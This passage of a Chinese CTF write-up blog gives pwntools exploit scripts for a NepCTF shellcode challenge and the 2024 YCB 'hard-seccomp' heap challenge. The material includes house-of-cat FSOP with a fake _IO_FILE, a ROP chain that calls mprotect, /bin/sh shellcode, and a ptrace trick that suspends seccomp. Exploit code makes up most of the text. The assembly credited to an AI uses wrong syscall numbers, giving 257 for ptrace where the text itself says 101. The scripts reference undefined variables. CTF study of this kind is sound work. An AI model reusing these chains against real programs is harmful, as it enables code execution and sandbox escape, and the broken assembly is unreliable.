<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;neptune-49685.nepctf.lemonprefect.cn&#x27;</span>,<span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="literal">True</span>, typ=<span class="string">&quot;tcp&quot;</span>)</span><br><span class="line"></span><br><span class="line">opennat=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	mov r15,rdx</span></span><br><span class="line"><span class="string">	mov rax,101</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rdi,0x67616c662f2e  </span></span><br><span class="line"><span class="string">	push rdi</span></span><br><span class="line"><span class="string">	mov rdi,rsp </span></span><br><span class="line"><span class="string">	mov rsi,0 </span></span><br><span class="line"><span class="string">	mov rdx,0 </span></span><br><span class="line"><span class="string">	mov rax,2</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rax,0</span></span><br><span class="line"><span class="string">	mov rdi,3</span></span><br><span class="line"><span class="string">	mov rsi,r15</span></span><br><span class="line"><span class="string">	mov rdx,0x100</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	mov rax,101</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rax,0</span></span><br><span class="line"><span class="string">	mov rdi,0</span></span><br><span class="line"><span class="string">	mov rsp,r15</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	mov rdx,0x100</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rax,0</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rax,0</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rax,0</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rax,0</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	mov rax,0</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">short_shellcode=<span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">shellcodeQWQ=[shellcode1,shellcode2,shellcode3]</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *(rebase +0x1a14)&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;do what you feel is right!&quot;</span>)</span><br><span class="line">p.send(opennat)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后打印出来的东西就是flag的大端小端反写，之后就是找工具转译了。</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1724511366296-7019bbcc-9ce3-46b8-bea3-c939ba7f99f9.png" alt="img"></p>
<h2 id="2024-YCB-hard-seccomp"><a href="#2024-YCB-hard-seccomp" class="headerlink" title="2024 YCB hard-seccomp"></a>2024 YCB hard-seccomp</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/translations/zh_CN/userspace-api/seccomp_filter.html">Seccomp BPF (基于过滤器的安全计算) — The Linux Kernel documentation</a></p>
<p>参考：[羊城杯 2024 pwn writeup (qanux.github.io)](<a target="_blank" rel="noopener" href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF">https://qanux.github.io/2024/08/28/羊城杯</a> 2024 pwn writeup&#x2F;index.html)</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/ptrace.2.html">PTRACE - Linux手册页-之路教程 (onitroad.com)</a></p>
<p>题目是一个简单堆题，这里house of cat进行了控制程序流，到我们可以写入shellcode到执行shellcode的脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;49.234.30.109&quot;</span>,9999)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span><span class="params">(i)</span>:</span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;&gt;&quot;</span>,str(i))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">add</span><span class="params">(idx,size)</span>:</span><br><span class="line">	<span class="title function_">cmd</span><span class="params">(<span class="number">1</span>)</span></span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Size: &quot;</span>,str(size))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">free</span><span class="params">(idx)</span>:</span><br><span class="line">	<span class="title function_">cmd</span><span class="params">(<span class="number">2</span>)</span></span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line">	</span><br><span class="line">def <span class="title function_">edit</span><span class="params">(idx,con)</span>:</span><br><span class="line">	<span class="title function_">cmd</span><span class="params">(<span class="number">3</span>)</span></span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Content: &quot;</span>,con)</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span><span class="params">(idx)</span>:</span><br><span class="line">	<span class="title function_">cmd</span><span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line"></span><br><span class="line">libcversion=<span class="string">&quot;235&quot;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)#old1</span><br><span class="line"><span class="title function_">show</span><span class="params">(<span class="number">0</span>)</span></span><br><span class="line">libc_addr=u64(p.recv(<span class="number">6</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x530</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x530</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;heap_addr&quot;</span>,hex(heap_addr))</span><br><span class="line">heapbase=heap_addr<span class="number">-0xcf0</span></span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line"><span class="keyword">if</span> libcversion==<span class="string">&quot;236&quot;</span>:</span><br><span class="line">	main_arena=libc_addr<span class="number">-1504</span></span><br><span class="line">	_IO_list_all=main_arena+<span class="number">0xA00</span></span><br><span class="line">	libcbase=_IO_list_all<span class="number">-0x000001f7660</span></span><br><span class="line">	_IO_list_all=libcbase+<span class="number">0x01f7660</span></span><br><span class="line">	openat2=libcbase+<span class="number">0x00010cb50</span></span><br><span class="line">	read=libcbase+<span class="number">0x010cce0</span></span><br><span class="line">	write=libcbase+<span class="number">0x0010cd80</span></span><br><span class="line">	IO_wfile_jumps=libcbase+<span class="number">0x001f30a0</span></span><br><span class="line">	setcontext=libcbase+<span class="number">0x041c00</span></span><br><span class="line">	pop_rdi=libcbase+<span class="number">0x0023b65</span></span><br><span class="line">	pop_rsi=libcbase+<span class="number">0x251be</span></span><br><span class="line">	pop_rdx=libcbase+<span class="number">0x166262</span></span><br><span class="line">	pop_rdx_rcx_rbx=libcbase+<span class="number">0x00101353</span></span><br><span class="line">	pop_rbp=libcbase+<span class="number">0x023a60</span></span><br><span class="line">	fd=libcbase+<span class="number">0x21B110</span></span><br><span class="line">	mprotect=libcbase+<span class="number">0x000116e60</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	main_arena=libc_addr<span class="number">-1504</span></span><br><span class="line">	_IO_list_all=main_arena+<span class="number">0xa00</span></span><br><span class="line">	libcbase=_IO_list_all<span class="number">-0x021b680</span></span><br><span class="line">	_open=libcbase+<span class="number">0x001144e0</span></span><br><span class="line">	openat2=libcbase+<span class="number">0x00000114640</span></span><br><span class="line">	_write=libcbase+<span class="number">0x0114870</span></span><br><span class="line">	_read=libcbase+<span class="number">0x0001147d0</span></span><br><span class="line">	_IO_wfile_overflow =libcbase+<span class="number">0X0000086390</span></span><br><span class="line">	IO_wfile_jumps=libcbase+<span class="number">0x0000000002170c0</span></span><br><span class="line">	setcontext =libcbase+<span class="number">0x0000000539e0</span></span><br><span class="line">	pop_rdi=libcbase+<span class="number">0x02a3e5</span></span><br><span class="line">	pop_rsi=libcbase+<span class="number">0x171a12</span></span><br><span class="line">	pop_rdx_rcx_rbx=libcbase+<span class="number">0X108b03</span></span><br><span class="line">	pop_rdx_r12=libcbase+<span class="number">0x011f2e7</span></span><br><span class="line">	sendmsg=libcbase+<span class="number">0x00000127950</span></span><br><span class="line">	recvmsg=libcbase+<span class="number">0x00001277e0</span></span><br><span class="line">	mprotect=libcbase+<span class="number">0x0011eaa0</span></span><br><span class="line">	fd=libcbase+<span class="number">0x21B110</span></span><br><span class="line">	pop_rsp_rbp=libcbase+<span class="number">0x0133b30</span></span><br><span class="line">	pop_rbp=libcbase+<span class="number">0x0002a2e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">new_addr=heapbase+<span class="number">0x1210</span></span><br><span class="line">heapaddr=heapbase+<span class="number">0x290</span></span><br><span class="line">edit(<span class="number">0</span>,p64(fd)*<span class="number">2</span>+p64(heap_addr)+p64(_IO_list_all<span class="number">-0x20</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)#<span class="number">2</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x530</span>)</span><br><span class="line">iu=<span class="keyword">asm</span>(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 425</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_heap=heapbase+<span class="number">0x2000</span>+<span class="number">0x650</span></span><br><span class="line">fake_io_addr=heapbase+<span class="number">0xcf0</span> # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(<span class="number">0x0</span>)#这个并不是_flag也不是rdi         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x100</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x400</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_wfile_jumps+<span class="number">0x30</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br><span class="line">fake_IO_FILE+=b<span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">qwq=b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x68</span>+p64(fake_io_addr+<span class="number">0xF8</span>)+p64(fake_io_addr+<span class="number">0x200</span>)+p64(fake_io_addr+<span class="number">0x200</span>)</span><br><span class="line">qwq+=p64(fake_io_addr+<span class="number">0x200</span>)+p64(pop_rdi)</span><br><span class="line">qwq=qwq.ljust(<span class="number">0xa0</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">qwq+=p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0xdeadbeef</span>)+b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">ROP=p64(pop_rdi)+p64(heapbase+<span class="number">0x1000</span>)+p64(pop_rsi)+p64(<span class="number">0x2000</span>)+p64(pop_rdx_rcx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rbp)+p64(stack_heap+<span class="number">0x488</span>)+p64(new_addr+<span class="number">0x10</span>)<span class="meta">#</span></span><br><span class="line"><span class="meta">qwq+=ROP</span></span><br><span class="line">fake_IO_FILE+=qwq</span><br><span class="line"><span class="meta">#gdb.attach()</span></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"><span class="meta">#gdb.attach(p,<span class="string">&quot;b _IO_switch_to_wget_mode&quot;</span>)</span></span><br><span class="line">edit(<span class="number">4</span>,shellcode)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x900</span>)</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>,hex(libcbase))</span><br><span class="line">print(<span class="string">&quot;heapbase:&quot;</span>,hex(heapbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>程序的沙盒状态如下</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726111417293-c9c0dab2-a03b-43ef-8077-3c444b56027c.png" alt="img"></p>
<p>一开始本来想用openat2，但是因为Linux内核5.6才有openat2的引入，远程发现是5.4的版本左右，所以是不支持openat2的。</p>
<p>不清楚本地的flag是否在当前目录下，..&#x2F;  &#x2F;  ..&#x2F;..&#x2F;目录我都找过，但是无济于事</p>
<p>所以只能另辟蹊径，一开始聚焦于io_uring的利用，但是本人没有仔细研究，所以抄了几家shellcode也就放弃了，听Qanux师傅说本地能通，但是远程不能通。回到沙盒状态，我们注意到被禁用的系统调用并不是直接kill，而是一个TRACE，这意味着如果我们可能追踪回这个进程并加以利用。</p>
<p>如何做？</p>
<p>我们需要用ptrace系统调用（系统调用号：101）去追回，下面是我们暂停seccomp所需要的request和对应的选项</p>
<p><strong>PTRACE_SETOPTIONS</strong>(since Linux 2.4.6; see BUGS for caveats)</p>
<p><strong>PTRACE_O_SUSPEND_SECCOMP</strong>(since Linux 4.3)选项</p>
<p>暂停tracee的seccomp保护。这适用于任何模式，并且可以在示踪尚未安装seccomp筛选器时使用。也就是说，一个有效的用例是在被跟踪安装之前，暂停被跟踪的seccomp保护，让被跟踪安装过滤器，然后在恢复过滤器时清除此标志。设置此选项要求跟踪器具有CAP_SYS_ADMIN功能，未安装任何seccomp保护，并且自身未设置PTRACE_O_SUSPEND_SECCOMP。</p>
<p>那我们的代码执行流程就有了，首先fork一个子进程，我们尝试在子进程中执行execve的代码</p>
<p>然后父进程wait等待子进程返回信号，如果返回信号应该是子进程的TRACEME选项起作用了，下一句就是execve的代码。父进程此时attach过去接管子进程，然后顺便把子进程的沙盒关了，那么我们此时的子进程就会执行execve不受阻拦并替代为对应的shell。</p>
<h3 id="shellcode-v-1"><a href="#shellcode-v-1" class="headerlink" title="shellcode v.1"></a>shellcode v.1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line"><span class="keyword">if</span> (!pid)</span><br><span class="line">&#123;<span class="comment">//子进程</span></span><br><span class="line">    ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//父进程</span></span><br><span class="line">    waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ptrace(PTRACE_O_SUSPEND_SECCOMP,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是AI根据我们伪代码写的汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    ; fork() system call</span><br><span class="line">    mov rax, <span class="number">57</span>          ; syscall number <span class="keyword">for</span> <span class="title function_">fork</span><span class="params">()</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax        ; check <span class="keyword">if</span> the result is <span class="number">0</span></span><br><span class="line">    mov r15,rax</span><br><span class="line">    jz child_process     ; jump to child process code <span class="keyword">if</span> result is <span class="number">0</span></span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    ; waitpid() system call</span><br><span class="line">    mov rax, <span class="number">7</span>          ; syscall number <span class="keyword">for</span> <span class="title function_">waitpid</span><span class="params">()</span></span><br><span class="line">    mov rdi, r15        ; pid (use the pid from fork)</span><br><span class="line">    xor rsi, rsi        ; options</span><br><span class="line">    xor rdx, rdx        ; status</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 16         ; request type PTRACE_ATTACH</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_O_SUSPEND_SECCOMP, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0x42000003 ; request type PTRACE_O_SUSPEND_SECCOMP</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_COUT, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0x7; request type PTRACE_O_SUSPEND_SECCOMP</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; Exit</span><br><span class="line">    mov rax, <span class="number">60</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">exit</span><span class="params">()</span></span><br><span class="line">    xor rdi, rdi        ; status</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    ; ptrace(TRACE_ME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0          ; request type TRACE_ME</span><br><span class="line">    xor rsi, rsi        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span 